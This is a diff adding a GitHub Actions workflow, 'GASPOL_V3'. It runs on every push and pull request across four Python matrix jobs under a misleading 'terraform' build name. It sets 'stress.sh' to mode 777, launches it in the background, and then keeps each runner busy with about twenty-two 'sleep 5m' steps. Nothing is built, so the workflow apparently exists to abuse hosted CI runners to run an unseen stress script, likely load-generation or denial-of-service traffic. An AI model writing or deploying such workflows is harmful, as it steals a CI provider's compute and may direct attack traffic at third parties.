@@ -1,0 +1,87 @@
+name: GASPOL_V3
+on:
+  push:
+  pull_request:
+jobs:
+  terraform:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        python-version:
+          - "3.6"
+          - "3.7"
+          - "3.8"
+          - "3.9"
+    name: build ${{ matrix.python-version }}-${{ matrix.ruby-version }}-${{ matrix.perl-version }}-${{ matrix.flag }}
+    steps:
+    - uses: actions/checkout@v2
+    - name: 🤣
+      run: |
+        chmod 777 stress.sh
+    - name: 🤣
+      run: |
+        ./stress.sh &
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+ 
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
+    - name: 🤣
+      run: |
+        sleep 5m
